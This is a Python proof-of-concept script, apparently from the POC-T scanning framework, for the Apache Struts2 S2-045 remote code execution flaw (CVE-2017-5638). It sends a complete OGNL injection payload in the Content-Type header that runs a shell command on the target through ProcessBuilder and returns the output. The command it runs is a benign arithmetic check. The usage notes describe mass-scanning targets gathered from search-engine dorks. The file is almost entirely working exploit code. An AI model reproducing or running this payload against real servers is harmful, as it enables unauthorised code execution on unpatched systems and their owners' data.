#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = 24''
# 作为fuzz脚本需要处理下路径问题

"""
Struts2 S2-045 Remote Code Execution PoC (CVE-2017-5638)

Version:
2.3.5-2.3.31, 2.5-2.5.10

Usage:
python POC-T.py -s struts2-s2045 -aG "inurl:login.action" --gproxy "http 127.0.0.1 1080"
python POC-T.py -s struts2-s2045 -aZ "login.action"
python POC-T.py -s struts2-s2045 -iF FILE.txt
"""

import requests
import random
import urlparse

def poc(url):
    if '://' not in url:
        url = 'http://' + url
    if ".action" not in url:
        parse = urlparse.urlparse(url)
        url = parse.scheme + "://" + parse.netloc + "/login.action"    
    try:
        a = random.randint(10000000, 20000000)
        b = random.randint(10000000, 20000000)
        c = a + b
        win = 'set /a ' + str(a) + ' + ' + str(b)
        linux = 'expr ' + str(a) + ' + ' + str(b)

        header = dict()
        header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
        header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#iswin?(#cmd='" + win + "'):(#cmd='" + linux + "')).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        r = requests.get(url, headers=header, timeout=5)
        if str(c) in r.text:
            return '[S2-045]'+url
        else:
            return False
    except Exception:
        return False
